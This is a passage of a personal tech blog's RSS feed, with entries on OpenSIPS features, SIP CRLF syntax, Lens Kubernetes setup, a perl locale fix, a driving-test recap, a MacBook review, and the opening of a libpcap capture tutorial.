      <title>Calls management using the new Call API tool</title>
      <link>https://wdd.js.org/opensips/blog/calls-manager/</link>
      <pubDate>Thu, 11 Feb 2021 20:20:29 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/calls-manager/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;看来OpenSIPS的目标已经不仅仅局限于做代理了，而是想做呼叫控制。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;原文：&lt;a href=&#34;https://blog.opensips.org/2020/06/11/calls-management-using-the-new-call-api-tool/&#34;&gt;https://blog.opensips.org/2020/06/11/calls-management-using-the-new-call-api-tool/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The new &lt;a href=&#34;https://github.com/OpenSIPS/call-api&#34;&gt;Call API&lt;/a&gt; project consists of a standalone server able to serve a set of API commands that can be used to control SIP calls (such as start a new call, put a call on hold, transfer it to a different destination, etc.). In order to provide high performance throughput, the server has been developed in Go programming language, and provides a WebSocket interface that is able to handle &lt;a href=&#34;https://www.jsonrpc.org/specification&#34;&gt;Json-RPC 2.0&lt;/a&gt; requests and notifies.&lt;!-- raw HTML omitted --&gt;Although it runs as a standalone daemon able to control calls, it does not directly interact with SIP calls, but just communicates with a SIP proxy that actually provides the SIP stack and intermediates the calls. The first release of the Call API is using &lt;a href=&#34;https://opensips.org/&#34;&gt;OpenSIPS&lt;/a&gt; for this purposes, but this is a loose requirement – in the future other SIP stacks can be used, with the appropriate connectors.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Improved series-based call statistics using OpenSIPS 3.2</title>
      <link>https://wdd.js.org/opensips/blog/call-stat/</link>
      <pubDate>Thu, 11 Feb 2021 20:11:43 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/call-stat/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;早期1x和2x版本的OpenSIPS，统计模块只有两种模式，一种时计算值，另一种是从运行开始的累加值。而无法获取比如说最近一分钟，最近5分钟，这样的基于一定周期的统计值，在OpenSIPS 3.2上，提供了新的解决方案。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;原文：&lt;a href=&#34;https://blog.opensips.org/2021/02/02/improved-series-based-call-statistics-using-opensips-3-2/&#34;&gt;https://blog.opensips.org/2021/02/02/improved-series-based-call-statistics-using-opensips-3-2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Real-time call statistics is an excellent tool to evaluate the quality and performance of your telephony platform, that is why it is very important to expose as many statistics as possible, accumulated over different periods of time.&lt;!-- raw HTML omitted --&gt;OpenSIPS provides an easy to use &lt;a href=&#34;https://www.opensips.org/Documentation/Interface-Statistics-3-2&#34;&gt;interface&lt;/a&gt; that exposes simple primitives for creating, updating, and displaying various statistics, both &lt;a href=&#34;https://www.opensips.org/Documentation/Interface-CoreStatistics-3-2&#34;&gt;well defined&lt;/a&gt; as well as tailored to your needs. However, the current implementation comes with a limitation: statistics are gathered starting from the beginning of the execution, up to the point they are read. In other words, you cannot gather statistics only for a limited time frame.&lt;!-- raw HTML omitted --&gt;That is why starting with OpenSIPS 3.2, the statistics module was enhanced with a new type of statistics, namely statistics series, that allow you to provide custom stats accumulated over a specific time window (such as one second, one minute, one hour, etc.). When the stat is evaluated, only the values gathered within the specified time window is accounted, all the others are simply dropped (similar to a time-based circular buffer, or a sliding window). Using these new stats, you can easily provide standard statistics such as ACD, AST, PPT, ASR, NER, CCR in a per minute/hour fashion.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Exploring SSL/TLS libraries for OpenSIPS 3.2</title>
      <link>https://wdd.js.org/opensips/blog/opensips3-tls/</link>
      <pubDate>Thu, 11 Feb 2021 20:04:16 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/opensips3-tls/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;OpenSIPS和OpenSSL之间的集成总是存在各种个样的问题。我之前就遇到死锁的问题，opensips CPU cpu占用很高。但是不再处理SIP消息。最终排查下来，是和OpenSSL有关。
深层次的原因，是因为OpenSIPS是个多进程的程序，而OpenSSL主要是面向多线程的程序。
在OpenSIPS3.2版本上，官方团队列出了几个OpenSSL的替代品，并进行优劣对比，最终选择一个比较好的方案。
我们一起来看看吧。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;For the purpose of providing secure SIP communication over the TLS protocol, OpenSIPS uses the &lt;strong&gt;OpenSSL&lt;/strong&gt; library, the most popular TLS implementation across the Internet. However, integrating OpenSSL with OpenSIPS has posed a series of challenges starting with OpenSSL version 1.1.0, and has caused quite a few bugs and crashes since then, as presented in more detail in &lt;a href=&#34;https://blog.opensips.org/2020/01/16/the-opensips-and-openssl-journey/&#34;&gt;this article&lt;/a&gt;.&lt;!-- raw HTML omitted --&gt;As such, for the new OpenSIPS 3.2 version, we have finally decided to provide support for an additional TLS library, as an alternative to OpenSSL. In this article, we are going to take a look at the options we have explored and the criteria and factors that we used to choose a candidate.&lt;/p&gt;</description>
    </item>
    <item>
      <title>南京尧新科目二考试考试回顾</title>
      <link>https://wdd.js.org/posts/2021/01/</link>
      <pubDate>Mon, 11 Jan 2021 19:13:31 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/01/</guid>
      <description>&lt;p&gt;科目二倒库和四项练的差不多了，决定去参加考试，考试虽然一波三折，但结果还是好的，一次通过了&lt;/p&gt;
&lt;h1 id=&#34;考场熟悉&#34;&gt;考场熟悉&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;考场倒库有14各区，没什么好讲的。&lt;/li&gt;
&lt;li&gt;四项有4各环线，每个环线上有两个考试线路，所以一共是8条线路&lt;/li&gt;
&lt;li&gt;务必看懂各种符号的含义，例如曲线，侧方， 直角与坡道&lt;/li&gt;
&lt;li&gt;【重点】当你知道你自己在那条线上考试之后，务必对照着线路图，将&lt;strong&gt;四项的顺序以及位置牢记于心&lt;/strong&gt;。虽然路上会有牌子指示下一项内容是什么，但是考试的时候，由于视线等各种原因可能不会去在意。也有人，看到前面是直角，就以为是前面是直角转弯，结果到了真正直角转弯的位置，却没有做直角相关的操作，导致考试失败。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如，当你被选择到8号线的四项时，你到了7-8待考等待区后，等待自己的考试车。在等待过程中按照平面图，可以发现，离待考最近的起点之后，8号线，第一个考试项目侧方停车，然后是直角转弯，接着是S弯，最后是坡道。&lt;/p&gt;
&lt;h1 id=&#34;模拟考相关&#34;&gt;模拟考相关&lt;/h1&gt;
&lt;h2 id=&#34;模拟的费用以及项目内容&#34;&gt;模拟的费用以及项目内容&lt;/h2&gt;
&lt;p&gt;模拟的费用是360，包含一下内容&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;倒车入库120，可以倒库3次&lt;/li&gt;
&lt;li&gt;四项有八条线路，每个线路各跑一次&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;四项的车和倒库的车是不同的，这点需要注意。&lt;/p&gt;
&lt;h2 id=&#34;模拟考有用吗&#34;&gt;模拟考有用吗？&lt;/h2&gt;
&lt;p&gt;我觉的是有用的&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一般驾校只有一两条线路，实际考场有8条线路。每条线路你都可以跑一次，从1号线到8号线。跑过这8条线，你会基本知道自己四项中哪些项目比较容易出错。可以针对性加强。另外也可以找找坡道的点位。&lt;/li&gt;
&lt;li&gt;跑模拟四项的时候，有个教练会坐在副驾驶上。他会不断的催促你，此时你千万不要让他的催促导致你连续的出错，进而影响到你考试的心态。你是交了钱的，离合和油门都在你这边，教练再催，也是没办法让车加速的。你不要怂。【注意：在真实考试时，副驾驶是没有人的。】&lt;/li&gt;
&lt;li&gt;教练为什么要不停的催你，因为你越快跑完8条线路，他就可以接更多的学员，他手里的小票就越多，提成就越多。当你模拟完8条线路，教练会让你再买几条线路。线路其实是可以按条买的，每条线跑一次30块。真是车轮一转，家财万贯。车轮一响，黄金万两啊。&lt;/li&gt;
&lt;li&gt;虽然倒库的车库有14个，但是&lt;strong&gt;你模拟的那个车库，其实有极大的可能就是你真实考试的那个车库&lt;/strong&gt;。这样你就可以提前熟悉一下车库的点位。我比较菜，模拟三次的倒库都倒失败了。但是我从三次失败中也学到了自己失败的原因。从而在真实考试时成功通过。倒库如果你三次都失败了，也可以单独买的。倒3次60块。倒6次120块。但是这就不建议再花钱了。你应该记住自己的错误的点。比如是那边压线了，然后回到驾校，和你的教练沟通一下。驾校的教练会给你更加有用的建议。另外你务必要记住自己是几号库，你只要和驾校教练沟通一下，他都知道这个库位的处理细节的。&lt;/li&gt;
&lt;li&gt;如果我没有模拟考过，很可能我科目二第一次会挂，然后还要花时间去搞这件事。如果能用钱解决的事情，我更希望能节省一些时间。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;心态&#34;&gt;心态&lt;/h1&gt;
&lt;p&gt;考试的心态很重要，和我一起参见考试的一个同学。他没有参加模拟考，但是他在考试中倒库一把就倒进去了。我认为他是比较牛逼的。但是有可能他骄傲了，挂在了几个转向灯和坡道定点上。侧方停车时，出库居然忘记打转向灯了。&lt;/p&gt;
&lt;p&gt;也有人忘记系安全带了。&lt;/p&gt;
&lt;p&gt;很多小的点，也很容易的点。在驾校都练的很熟练，但是一到考场，就总是丢三落四的忘记。为什么会有这种场景的。&lt;/p&gt;
&lt;p&gt;因为心态变了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>macbook pro 使用三年后的感受</title>
      <link>https://wdd.js.org/posts/2020/12/kxpswu/</link>
      <pubDate>Wed, 30 Dec 2020 13:25:21 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/12/kxpswu/</guid>
      <description>&lt;p&gt;我的macbook是2017买的, 使用到今天大概1204天。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最初的使用体验是&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;触摸板很灵敏&lt;/li&gt;
&lt;li&gt;屏幕很高清&lt;/li&gt;
&lt;li&gt;系统很流畅&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;三年中出现过的问题&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;键盘中的几个按键出现过问题，按键不灵敏。17年是用的蝴蝶键盘，这个键盘问题很多。最新版已经换成了剪刀脚键盘了。&lt;/li&gt;
&lt;li&gt;屏幕老化，屏幕的四周出现淡红色的红晕，但是不影响使用。&lt;/li&gt;
&lt;li&gt;如果不充电的情况下，掉电蛮快的，而且有时候电量还很多，就自动关机。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;现在的感觉：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;触摸板我基本不会用了，因为大部分时间我都是用键盘可以搞定一切。因为我用了vim编辑器。&lt;/li&gt;
&lt;li&gt;我也不再使用macbook pro自带的键盘，因为真是不好用。所有的笔记本键盘，除了thinkpad的键盘。都不太好用，不适合长时间打字。所以我用了外接的静电容键盘。&lt;/li&gt;
&lt;li&gt;无论多么好的自带键盘，都比不过外接的键盘，毕竟是专业的。当然除非你经常初查或者移动，外接键盘真是非常值得入手。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;关于下一台电脑：&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;下一台电脑我会等待M2芯片, macbook pro或则是macbook mini， 这个我还没想好。我对命令行以及相关unix有着很大的依赖。即使用ubuntu, 我也不可能再使用windows。&lt;/p&gt;</description>
    </item>
    <item>
      <title>SIP消息格式CRLF</title>
      <link>https://wdd.js.org/opensips/ch3/sip-crlf/</link>
      <pubDate>Fri, 25 Dec 2020 17:44:31 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/sip-crlf/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         generic-message  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  start-line
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             *message-header
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             CRLF
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; message-body &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         start-line       &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  Request-Line / Status-Line
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中在&lt;a href=&#34;https://tools.ietf.org/html/rfc2543&#34;&gt;rfc2543&lt;/a&gt;中规定&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CR        &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  %d13 ; US-ASCII CR, carriage &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; character 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LF        &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  %d10 ; US-ASCII LF, line feed character
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;项目&lt;/th&gt;
          &lt;th&gt;十进制&lt;/th&gt;
          &lt;th&gt;字符串表示&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;CR&lt;/td&gt;
          &lt;td&gt;13&lt;/td&gt;
          &lt;td&gt;\r&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;LF&lt;/td&gt;
          &lt;td&gt;10&lt;/td&gt;
          &lt;td&gt;\n&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;也就是说在一个SIP消息中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;headline&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;key:v&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;some_body&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以CRLF就是 &lt;code&gt;\r\n&lt;/code&gt; &lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc3261&#34;&gt;https://tools.ietf.org/html/rfc3261&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc2543&#34;&gt;https://tools.ietf.org/html/rfc2543&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>lens k8s IDE</title>
      <link>https://wdd.js.org/posts/2020/12/ai1lnu/</link>
      <pubDate>Wed, 23 Dec 2020 19:28:16 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/12/ai1lnu/</guid>
      <description>&lt;h1 id=&#34;下载安装&#34;&gt;下载安装&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/attachments/yuque/0/2020/dmg/280451/1608723355915-643e36ab-7e24-4412-a5fc-5be9f03d4cea.dmg?_lake_card=%7B%22uid%22%3A%221608723332085-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fdmg%2F280451%2F1608723355915-643e36ab-7e24-4412-a5fc-5be9f03d4cea.dmg%22%2C%22name%22%3A%22Lens-4.0.4.dmg%22%2C%22size%22%3A128698408%2C%22type%22%3A%22%22%2C%22ext%22%3A%22dmg%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%2208dCP%22%2C%22card%22%3A%22file%22%7D&#34;&gt;Lens-4.0.4.dmg&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;添加集群&#34;&gt;添加集群&lt;/h1&gt;
&lt;p&gt;在k8s master 节点上使用输入下面的指令，** 将输出内容复制一下**&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl config view --minify --raw
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;选择fiel--add-cluster&#34;&gt;选择Fiel &amp;gt; Add cluster&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/12/ai1lnu/2022-10-29-19-37-01.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;粘贴&#34;&gt;粘贴&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/12/ai1lnu/2022-10-29-19-37-14.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;集群就显示出来了&#34;&gt;集群就显示出来了&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/12/ai1lnu/2022-10-29-19-37-25.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>The OpenSIPS and OpenSSL journey</title>
      <link>https://wdd.js.org/opensips/blog/openssl-opensips/</link>
      <pubDate>Mon, 21 Dec 2020 15:44:33 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/openssl-opensips/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;In order to provide secure SIP communication over TLS connections, OpenSIPS uses the &lt;a href=&#34;https://www.openssl.org/&#34;&gt;OpenSSL library&lt;/a&gt;, probably the most widely used open-source TLS &amp;amp; SSL library across the Internet. The fact that it is so popular and largely used makes it more robust, therefore a great choice to enforce security in a system! That was the reason it was chosen to be used in OpenSIPS in the first place. However, being designed as a multi-threaded library, while OpenSIPS is a multi-process application, integrating it was not an easy task. Furthermore, maintaining it was not trivial either. And the major changes in the OpenSSL library within the last couple of years have proven that. Once the library maintainers decided to have a more robust thread-safe approach, things started to break in OpenSIPS. Hence the numerous issues reported withing the last couple of years related to SSL bugs and crashes. The purpose of this post is to present you the challenges we faced, and how we dealt with them.
This article describes the way OpenSSL, a multi-threaded designed library, was designed to work in OpenSIPS, a multi-process application, and what was the journey of maintaining the code by adapting to the changes throughout the years in the OpenSSL library.&lt;/p&gt;</description>
    </item>
    <item>
      <title>perl: warning: Setting locale failed.</title>
      <link>https://wdd.js.org/posts/2020/12/setting-locale-failed/</link>
      <pubDate>Thu, 17 Dec 2020 11:42:20 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/12/setting-locale-failed/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;perl: warning: Setting locale failed.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;perl: warning: Please check that your locale settings:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	LANGUAGE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unset&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	LC_ALL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unset&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	LC_CTYPE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	LANG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en_US.UTF-8&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    are supported and installed on your system.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;perl: warning: Falling back to the standard locale &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;add in .bashrc&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export LANG&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;en_US.UTF-8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export LANGUAGE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;en_US.UTF-8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export LC_COLLATE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;C
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export LC_CTYPE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;en_US.UTF-8
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;source ~/.bashrc&lt;/p&gt;</description>
    </item>
    <item>
      <title>Get: shift &#43; 鼠标滚轮 左右滚动页面</title>
      <link>https://wdd.js.org/posts/2020/12/yor2t9/</link>
      <pubDate>Mon, 07 Dec 2020 12:15:01 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/12/yor2t9/</guid>
      <description>&lt;p&gt;使用触摸板，可以左右滑动，来左右滚动只能部分显示的页面。但是在用鼠标的时候，由于鼠标滚轮只能上下滚动页面，所以不太方便。&lt;/p&gt;
&lt;p&gt;此时，你可以按住shift + 滚动鼠标滚轮，来实现左右滚动页面&lt;/p&gt;</description>
    </item>
    <item>
      <title>tcpdump filters</title>
      <link>https://wdd.js.org/network/hhlfi1/</link>
      <pubDate>Fri, 04 Dec 2020 13:32:16 +0800</pubDate>
      <guid>https://wdd.js.org/network/hhlfi1/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/attachments/yuque/0/2020/pdf/280451/1607059951958-8fd98d7f-52b2-49e3-a69f-b4e0fc08a215.pdf&#34;&gt;ethereal-tcpdump.pdf&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>libpcap tutorial</title>
      <link>https://wdd.js.org/network/ivzphz/</link>
      <pubDate>Fri, 04 Dec 2020 13:31:32 +0800</pubDate>
      <guid>https://wdd.js.org/network/ivzphz/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/attachments/yuque/0/2020/pdf/280451/1607059907885-3aec5ac7-27c2-42f0-bbc3-4a993dc28b6b.pdf&#34;&gt;libpcap-tutorial.pdf&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>tcpdump zine</title>
      <link>https://wdd.js.org/network/yscigi/</link>
      <pubDate>Fri, 04 Dec 2020 13:29:53 +0800</pubDate>
      <guid>https://wdd.js.org/network/yscigi/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/attachments/yuque/0/2020/pdf/280451/1607059806872-996e8e81-0e4e-41e4-9d29-75b38eb33061.pdf&#34;&gt;tcpdump-zine.pdf&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>pcap抓包教程</title>
      <link>https://wdd.js.org/network/uq5cii/</link>
      <pubDate>Wed, 02 Dec 2020 13:27:13 +0800</pubDate>
      <guid>https://wdd.js.org/network/uq5cii/</guid>
      <description>&lt;h1 id=&#34;准备条件&#34;&gt;准备条件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;有gcc编译器&lt;/li&gt;
&lt;li&gt;安装libpcap包&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;1c-试运行&#34;&gt;1.c 试运行&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;pcap.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;argv[])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;dev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Device: %s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, dev);
